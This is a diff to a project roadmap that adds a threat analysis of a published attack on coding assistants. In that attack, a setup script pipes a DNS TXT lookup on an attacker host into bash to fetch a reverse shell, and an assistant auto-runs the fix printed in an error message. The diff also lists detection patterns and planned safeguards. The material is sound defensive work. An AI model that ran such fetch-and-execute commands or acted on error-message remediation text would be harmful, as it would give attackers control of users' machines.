@@ -74,6 +74,79 @@ Candidates for 0.3.0 and later. Not commitments.
 - Signing fixture-suite releases once `verifier-conformance.md` reaches a
   stable conformance target; tracked also in `CONTRIBUTING.md`.
 
+## Runtime-indirection threat class (2026-07-02)
+
+Prompted by the 0din write-up "Clone This Repo and I Own Your Machine"
+(https://0din.ai/blog/clone-this-repo-and-i-own-your-machine). That attack ships
+a benign-looking `scripts/setup.sh` that runs `dig +short TXT _cfg.<attacker> |
+bash`, fetching a base64 reverse-shell payload from an attacker-controlled DNS TXT
+record; an assistant auto-runs the documented fix on error recovery. No malicious
+bytes live in the repository and nothing is hidden in the text: the payload
+materializes at runtime over DNS.
+
+This is the same trust-boundary failure GuideCheck already names (the reviewed
+surface should equal the executed surface), reached through runtime indirection and
+transitive script invocation rather than presentation-layer hidden text. It is
+inside the profile's thesis and only partly inside its current enforcement. Level 4
+provenance is irrelevant here: an attacker who owns the repository can anchor a
+byte-perfect Level 4 guide (`spec.md` section 27).
+
+Already covered by the profile, verified 2026-07-02:
+
+- `code-executing` actions (including `bash setup.sh`, `python -m pkg`) MUST require
+  approval at Level 3 (`spec.md` section 12); a correctly declared block that omits
+  approval is a blocking `approval.required-missing`.
+- the prohibition on "decode, deobfuscate, or execute encoded content from any
+  source" (`spec.md` section 15) names the base64-then-execute primitive.
+- the integrity-versus-instruction fetch distinction (`spec.md` section 15) already
+  separates the legitimate `_assistant-guide.<domain>` TXT anchor from a
+  payload-bearing TXT fetch.
+- a visible `curl URL | sh`, and now `dig TXT | bash` (see below), is a blocking
+  `command.fetch-execute`.
+
+Landed 2026-07-02 (reference verifier, additive detection, existing finding ids, no
+profile version change):
+
+- DNS clients (`dig`, `nslookup`, `host`, `drill`, `kdig`) added to the network-tool
+  set, and bash `/dev/tcp` and `/dev/udp` pseudo-devices modeled as network access,
+  in `scripts/guidecheck_verify.py`. A DNS TXT lookup piped into an interpreter now
+  raises the same blocking `command.fetch-execute` as `curl | sh`; a bare DNS lookup
+  or a `/dev/tcp` socket raises `network.command-implies-networked`. Regression
+  coverage in `scripts/test_parser_edge_cases.py` and fixture
+  `fixtures/invalid/command-dns-fetch-execute-as-normal`. Recorded in
+  `threat-register.md`.
+
+Candidates for the 0.7.0 normative cycle (not commitments; each changes the
+conformance contract and needs a version bump):
+
+- Bound the transitive execution surface. A `code-executing` action that invokes a
+  local script or entry point (`bash scripts/setup.sh`, `python -m pkg`, `make
+  target`, `npm run x`) points at logic outside the reviewed 8 KiB artifact, so "one
+  bounded artifact" does not hold transitively. Options: require the effective
+  commands to be inlined as their own action blocks, require an `exec-sha256` field
+  pinning the invoked bytes, or emit an explicit opaque-code-target finding so the
+  human knows the guide is not self-contained at that action. This is the single most
+  important structural gap the 0din class exposes, and it cannot be a verifier-only
+  patch: the verifier has no script contents at review time.
+- Add a stop-and-ask condition for acting on remediation text emitted by a failing
+  command, tool, or error message (`spec.md` section 13). This names the exact 0din
+  trigger: an assistant auto-running the fix printed by a RuntimeError. Any new
+  finding id born from this work (for example a command-driven undeclared-egress
+  error, or an unhashed-invoked-script error) must land with the spec text that
+  defines it, not as a verifier-only addition.
+- A Level 5 runtime requirement to surface the contents of an invoked script, and to
+  treat any network or DNS fetch inside it as a `networked` sub-action under the
+  declared `egress`, before approving a `code-executing` action. Durable defense;
+  consistent with existing egress-enforcement language (`spec.md` section 12).
+
+The planned instruction-surface scanner (see Adoption and distribution work, step 1)
+targets hidden-instruction channels in text and by design vacuously passes a
+repository with no hidden text, so it would not by itself flag the 0din repository.
+Extend step 1 with a runtime-primitive dimension: scan the scripts that documented
+setup commands invoke for fetch-then-execute shapes (pipe-to-interpreter, `base64 -d
+| sh`, `/dev/tcp`, DNS or web fetch into exec). The scanner stays a discovery front
+door, not a conformance gate.
+
 ## Near-term actions
 
 - The reference verifier CLI covers Level 1 through Level 3 in local-file mode;
